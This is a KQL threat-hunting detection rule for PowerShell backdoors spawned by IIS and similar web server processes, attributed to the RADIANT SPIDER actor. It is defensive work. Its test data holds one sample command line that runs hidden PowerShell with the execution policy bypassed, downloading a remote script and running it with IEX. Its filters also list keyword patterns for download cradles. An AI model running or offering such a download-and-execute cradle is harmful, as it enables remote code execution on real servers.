# Name
Radiant Spider (SilentSkimmer) Initial Access and Web Shell Activity - Lightweight PowerShell Backdoor Patterns

# Description
This detection identifies the execution of lightweight PowerShell backdoors used by the RADIANT SPIDER threat actor for persistence and payload delivery. It detects PowerShell processes spawned from web server processes using common download cradles and obfuscation flags associated with backdoor activity.

**Detection Engineer Notes:** RADIANT SPIDER employs a custom Golang loader that aggressively rewrites its configuration in memory. Because it bypasses hash-based IOC lists, network telemetry (beaconing to unknown IPs from unexpected processes like w3wp.exe) and behavioral tracking via DeviceNetworkEvents should be paired with the process creation detections above.

# References
- https://www.crowdstrike.com/adversaries/radiant-spider/
- https://www.sleuthcon.com/radiant-spider-unveiled

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- RADIANT SPIDER
- CL-CRI-0941
- SilentSkimmer

# MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1505.003: Server Software Component: Web Shell
- T1059.001: Command and Scripting Interpreter: PowerShell
- T1056.003: Input Capture: Web Portal Capture (Formjacking)

# Data Sources
- Microsoft Defender XDR (Advanced Hunting)
  - DeviceProcessEvents

# Query

## Query 3: Radiant Spider Lightweight PowerShell Backdoor Patterns

```kql
// Test Data Table
let DeviceProcessEvents = datatable(
    Timestamp: datetime,
    DeviceId: string,
    DeviceName: string,
    ActionType: string,
    FileName: string,
    FolderPath: string,
    SHA256: string,
    ProcessCommandLine: string,
    ProcessId: long,
    AccountName: string,
    AccountDomain: string,
    InitiatingProcessFileName: string,
    InitiatingProcessCommandLine: string,
    InitiatingProcessId: long,
    InitiatingProcessParentFileName: string
)
[
    // Case 1: Hidden PowerShell web request (Backdoor activity)
    datetime(2026-02-19 15:30:00), "device-guid-1", "WebSrv01.contoso.com", "ProcessCreated", 
    "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "a5b3c2d1...", 
    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadString('http://192.168.100.50/config.txt') | IEX\"", 8832, "DefaultAppPool", "IIS APPPOOL", 
    "w3wp.exe", "w3wp.exe -ap \"DefaultAppPool\"", 5100, "svchost.exe"
];
// Detection Logic
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "powershell.exe"
| where InitiatingProcessFileName in~ ("w3wp.exe", "cmd.exe", "jrun.exe")
// Looking for common PowerShell download cradles and obfuscation flags used by lightweight backdoors
| where ProcessCommandLine has_any ("-WindowStyle Hidden", "-w hidden", "-ep bypass", "-ExecutionPolicy Bypass")
  and ProcessCommandLine has_any ("Net.WebClient", "DownloadString", "Invoke-WebRequest", "IEX", "Invoke-Expression")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
```
